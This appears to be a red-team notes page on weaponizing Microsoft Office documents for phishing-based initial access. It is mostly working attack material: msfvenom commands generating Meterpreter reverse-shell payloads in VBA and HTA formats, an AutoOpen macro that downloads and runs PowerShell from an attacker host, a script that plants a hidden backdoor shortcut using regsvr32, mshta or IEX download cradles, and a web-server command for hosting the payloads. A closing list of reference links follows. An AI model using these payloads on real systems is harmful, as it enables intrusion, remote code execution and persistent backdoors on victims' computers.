---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - phishing
  - T1137
---
# Manual

TODO: Fill in the info

```
$ unzip file.doc
```

## 01 - Use Cases

Refer to the [[Microsoft Office Macros|microsoft office macros]] malware development section.

### 1.1 - VBA Macro

```
$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f vba-psh -o macro.vbs

$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f vba -o macro.vbs
```

### 1.2 - HTA Callback Shell

```
$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f hta-psh -o hta-payload.hta
```

### 1.3 - Shortcut Link

`$ cat macro.vbs`

---

```vbscript
Sub AutoOpen()
    Shell("powershell -c ""(Invoke-WebRequest ""http://<IP>/pwsh_cmds.txt"").Content | powershell"" ")
End Sub
```


> [!NOTE] Shortcut `.lnk` Character Limit
> The TargetPath has a limit of 260 characters long

`$ cat pwsh_cmds.txt`

---

```powershell
$shortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\mal.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)

## Scriptlet files .sct
$Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
$Shortcut.Arguments = '/c regsvr32 /s /n /u /i:http://<IP>/shell.sct scrobj.dll'

# For HTA files
# $Shortcut.TargetPath = 'C:\Windows\System32\mshta.exe'
# $Shortcut.Arguments = 'http://<IP>/shell.hta'

# For conhost.exe and powershell one-liner
# $Shortcut.TargetPath = 'cmd'
# $Shortcut.Arguments = "/c `"powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http://<IP>/shell.ps1`'))`"`""
$Shortcut.Description = "A shortcut backdoor"
# $Shortcut.IconLocation = 'C:\path\to\icon.ico'
$Shortcut.IconLocation = 'shell32.dll,21'
$Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload
$Shortcut.WindowStyle = 7
$Shortcut.WorkingDirectory = "C:\Users\" + $Env:USERNAME + "\Public"
$Shortcut.Save()
attrib +h $shortcutPath
```

```
$ sudo python -m http.server [-d /path/to/directory/] 80
```

---
## References

### Filesec

#### Word

- [Filesec: `.asd`](https://filesec.io/asd)

- [Filesec: `.doc`](https://filesec.io/doc)

- [Filesec: `.docm`](https://filesec.io/docm)

- [Filesec: `.dot`](https://filesec.io/dot)

- [Filesec: `.wbk`](https://filesec.io/wbk)

### Excel

- [Filesec: `.xls`](https://filesec.io/xls)

- [Filesec: `.xlsb`](https://filesec.io/xlsb)

- [Filesec: `.xlsm`](https://filesec.io/xlsm)

- [Filesec: `.xlm`](https://filesec.io/xlm)

- [Filesec: `.xlam`](https://filesec.io/xlam)

- [Filesec: `.xlt`](https://filesec.io/xlt)

- [Filesec: `.xltm`](https://filesec.io/xltm)

- [Filesec: `.slk`](https://filesec.io/slk)

#### PowerPoint

- [Filesec: `.pot`](https://filesec.io/pot)

- [Filesec: `.potm`](https://filesec.io/potm)

- [Filesec: `.pps`](https://filesec.io/pps)

- [Filesec: `ppsm`](https://filesec.io/ppsm)

- [Filesec: `.ppt`](https://filesec.io/ppt)

- [Filesec: `pptm`](https://filesec.io/pptm)

- [Filesec: `.sldm`](https://filesec.io/sldm)

#### Publisher

- [Filesec: `.pub`](https://filesec.io/pub)

### Red Team Notes

- [Red Team Notes: Phishing - Office Macros](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/t1137-office-vba-macros)

### Hacktricks

- [Hacktricks: Phishing Files and Documents](https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology/phishing-documents)

### Hacking Articles

- [Hacking Articles: Multiple Ways to Exploit Windows Systems using Macros](https://www.hackingarticles.in/multiple-ways-to-exploit-windows-systems-using-macros/)

### Bank Security

- [Bank Security: MS Excel Weaponization Techniques](https://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5)

### mgeeky

- [mgeeky: Various Macros-Based RCEs](https://gist.github.com/mgeeky/9dee0ac86c65cdd9cb5a2f64cef51991)

### Black Hills Information Security

- [Black Hills Information Security: Click to Enable Content](https://www.blackhillsinfosec.com/click-to-enable-content/)

- [Black Hills Information Security: Phishing with PowerPoint](https://www.blackhillsinfosec.com/phishing-with-powerpoint/)